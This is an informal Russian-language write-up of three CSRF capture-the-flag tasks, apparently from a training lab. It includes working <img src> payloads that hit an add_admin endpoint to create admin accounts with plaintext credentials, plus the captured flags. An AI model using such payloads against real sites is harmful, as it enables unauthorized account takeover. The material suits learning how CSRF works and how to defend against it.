1. Get CSRF 
  Вошел в аккаунт testuser1, нажал на add admin, написал ник и пароль нажал кнопку add user, зашел в консоль разработчика F12, нашел запрос который это делает "http://92.63.179.34/add_admin?username=yukkio&password=sf666&isAdmin=yes&submit=Add+User",
  после в messages отправил следующее сообщение: <img src='http://92.63.179.34/add_admin?username=yukkio&password=sf666&isAdmin=yes&submit=Add+User' /> и зашел под этим юзером с админом и залутал флаг. "NOW_YOU_KNOW_GET_CSRF"
2. Post CSRF
  сделал тоже самое, хз наверное надо было по другому как то. "DID_YOU_LIKE_POST_CSRF"
3. JSON based CSRF
   зашел вошел в upload PoC написал тайный запрос в картинку и стал админом ОНО НЕ РАБОТАЕТ((((
   <img src="http://92.63.179.34/add_admin?username=seregapirat&password=eshkeree33&isAdmin=yes&submit=Add+User">
